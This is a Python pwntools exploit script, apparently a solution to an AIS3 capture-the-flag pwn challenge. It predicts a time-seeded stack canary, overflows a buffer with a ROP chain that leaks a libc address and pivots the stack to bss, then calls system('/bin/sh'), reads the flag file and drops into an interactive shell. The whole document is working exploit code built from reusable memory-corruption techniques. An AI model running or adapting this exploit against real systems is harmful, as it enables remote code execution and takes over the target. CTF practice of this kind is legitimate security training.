#!/usr/bin/env python
from pwn import *
from ctypes import *

context.arch = 'amd64'


host = 'pre-exam-pwn.ais3.org'
y = remote( host , 10005 )

libc = ELF( './libc-2.27.so' )

l = CDLL( './libc-2.27.so' )
l.srand( l.time(0) )

canary = ''

for i in range( 0x10 ):
    canary += chr( l.rand() & 0xff )

y.sendlineafter( '>' , str( 2147483648 ) )

ret = 0x40073e
leave_ret = 0x4009a2
pop_rbp = 0x400878
pop_rdi = 0x400ba3
pop_rsi_r15 = 0x400ba1
main = 0x4009e5
read_plt = 0x4007a0
puts_plt = 0x400780
bss = 0x602020 + 0x700

p = flat(
    pop_rdi,
    0x601ff0, # __libc_start_main got
    puts_plt,
    pop_rdi,
    0,
    pop_rsi_r15,
    bss,
    0,
    read_plt,
    pop_rbp,
    bss - 8,
    leave_ret
)

y.sendafter( '>' , 'a' * 0x100 + canary + p64( 0 ) * 3 + p )

l.srand( l.time(0) )

canary = ''

for i in range( 0x10 ):
    canary += chr( l.rand() & 0xff )


y.recvuntil( ':)\n' )

libc.address = u64( y.recv(6) + '\0\0' ) - libc.sym.__libc_start_main
success( 'libc -> %s' % hex( libc.address ) )


p = flat(
    pop_rdi,
    libc.search( '/bin/sh' ).next(), # __libc_start_main got
    libc.sym.system
)

y.send( p )

sleep( 0.3 )

y.sendline( 'cat /home/`whoami`/flag' )


y.interactive()